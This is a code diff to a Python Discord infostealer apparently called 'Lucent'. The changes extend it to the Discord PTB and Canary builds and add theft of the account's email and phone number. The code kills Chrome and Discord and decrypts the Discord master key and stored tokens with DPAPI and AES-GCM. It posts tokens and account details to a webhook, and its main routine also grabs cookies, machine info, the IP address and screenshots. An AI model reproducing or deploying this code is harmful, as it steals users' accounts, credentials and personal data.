@@ -8,6 +8,7 @@ import subprocess
 import json
 import uuid
 import shutil
+import re
 import base64
 import random
 import sqlite3
@@ -23,7 +24,7 @@ import browser_cookie3
 from Crypto.Cipher import AES
 import ctypes
 
-# I Need Sleeeeeeeeeeeeeeeeeeeeep!!!!!!!!!!!!! AAAAAAAAAAAAAAA
+# WWWWWWWW
 
 types = ""
 h00k = ""
@@ -31,6 +32,7 @@ h00k = ""
 os.system("TASKKILL /F /IM chrome.exe")
 os.system("TASKKILL /F /IM Discord.exe")
 os.system("TASKKILL /F /IM DiscordPTB.exe")
+os.system("TASKKILL /F /IM DiscordCanary.exe")
 os.system("cls") 
 
 def iplogger():
@@ -277,25 +279,33 @@ def extract_cookies(webhook_url):
         cookie_webhook(webhook_url, status_lines, os.path.join(os.environ['TEMP'], f"empty_{uuid.uuid4().hex}.db"))
 
 def get_master_key():
-    path = os.path.join(os.environ['APPDATA'], "Discord", "Local State")
-    with open(path, 'r', encoding='utf-8') as f:
-        local_state = json.load(f)
-    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    paths = [
+        os.path.join(os.environ['APPDATA'], "Discord", "Local State"),
+        os.path.join(os.environ['APPDATA'], "DiscordPTB", "Local State"),
+        os.path.join(os.environ['APPDATA'], "DiscordCanary", "Local State")
+    ]
+
+    for path in paths:
+        if os.path.exists(path):
+            with open(path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    
+
+    raise FileNotFoundError(".")
 
 def decrypt_value(encrypted_value: bytes, master_key: bytes) -> str:
     try:
-        if encrypted_value[:3] == b"v10": 
+        if encrypted_value[:3] == b"v10":
             iv = encrypted_value[3:15]
             payload = encrypted_value[15:-16]
             tag = encrypted_value[-16:]
-
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted = cipher.decrypt_and_verify(payload, tag)
             return decrypted.decode()
     except Exception as e:
-        pass
-
+        print(f"{e}")
     return ""
 
 def find_token():
@@ -305,95 +315,107 @@ def find_token():
     found_tokens = []
 
     if not os.path.exists(storage_path):
-        pass
+        print("             ")
         return
 
-    for file in os.listdir(storage_path):
-        if not file.endswith(".ldb") and not file.endswith(".log"):
-            continue
+    files = [f for f in os.listdir(storage_path) if f.endswith(".ldb") or f.endswith(".log")]
+    if not files:
+        print(" ")
+        return
 
-        try:
-            with open(os.path.join(storage_path, file), "r", errors="ignore") as f:
-                for line in f:
-                    matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
-                    for match in matches:
-                        encrypted_token = base64.b64decode(match)
-                        decrypted_token = decrypt_value(encrypted_token, master_key)
+    selected_file = random.choice(files)  
+    print(" ")
+
+    try:
+        with open(os.path.join(storage_path, selected_file), "r", errors="ignore") as f:
+            for line in f:
+                matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
+                for match in matches:
+                    encrypted_token = base64.b64decode(match)
+                    decrypted_token = decrypt_value(encrypted_token, master_key)
+                    if decrypted_token:
                         found_tokens.append(decrypted_token)
-        except PermissionError:
-            continue
+    except PermissionError:
+        print(f" ")
+        return
 
     if found_tokens:
         for token in found_tokens:
             webhook(token)
     else:
-        pass
+        print("No tokens found.")
 
 def webhook(token):
-
-    api = "https://discord.com/api/v10/users/@me"
+    api = "https://discord.com/api/v6/users/@me"
     headers = {
         "Authorization": f"{token}"
     }
     get_info = requests.get(api, headers=headers)
     if get_info.status_code == 200:
-            user = get_info.json()
+        user = get_info.json()
 
     user_id = user["id"]
     user_name = user["username"]
+    email = user["email"]
+    phone = user["phone"]
     avatar_hash = user['avatar']
 
     avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None
 
     payload = {
-    "username": "Lucef | Token", 
-    "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
-    "embeds": [
-        {
-            "title": f"{user_name} | Lucent",  
-            "fields": [
-                {
-                    "name": "🔑 Token",
-                    "value": f"```{token}```",
-                    "inline": False  
+        "username": "Lucef | Token", 
+        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
+        "embeds": [
+            {
+                "title": f"{user_name} | Lucent",  
+                "fields": [
+                    {
+                        "name": "🔑 Token",
+                        "value": f"```{token}```",
+                        "inline": False
+                    },
+                    {
+                        "name": "📫️ Email",
+                        "value": f"```{email}```",
+                        "inline": False
+                    },
+                    {
+                        "name": "🔏 Password",
+                        "value": f"Soon",
+                        "inline": True
+                    },
+                    {
+                        "name": ":mobile_phone: Phone",
+                        "value": f"{phone}",
+                        "inline": True
+                    },
+                    {
+                        "name": "💎 Nitro",
+                        "value": "im gay (Not Working) 💀",
+                        "inline": True
+                    }
+                ],
+                "footer": {
+                    "text": "zakocord. | github.com/zakocord/Lucent",
                 },
-                {
-                    "name": ":identification_card: User ID",
-                    "value": f"{user_id}",
-                    "inline": False
-                },
-                {
-                    "name": ":identification_card: User ID",
-                    "value": f"{user_id}",
-                    "inline": False
-                },
-            ],
-            "footer": {
-                "text": "zakocord. ",
-            },
-            "thumbnail": {
-                "url": f"{avatar_url}" 
+                "thumbnail": {
+                    "url": f"{avatar_url}" 
+                }
             }
-        }
-    ]
-}
+        ]
+    }
 
-
-    try:
-        response_webhook = requests.post(h00k, json=payload)
-        if response_webhook.status_code == 204:
-            pass
-        else:
-            pass
-    except Exception as e:
-        pass
-
+    response_webhook = requests.post(h00k, json=payload)
+    if response_webhook.status_code == 204:
+        print(" ")
+    else:
+        print(f"                            ")
 def main():
     checker()
     find_token()
     machineinfo()
-    iplogger()
     extract_cookies(h00k)
+    iplogger()
     screenshot()
 
 main()
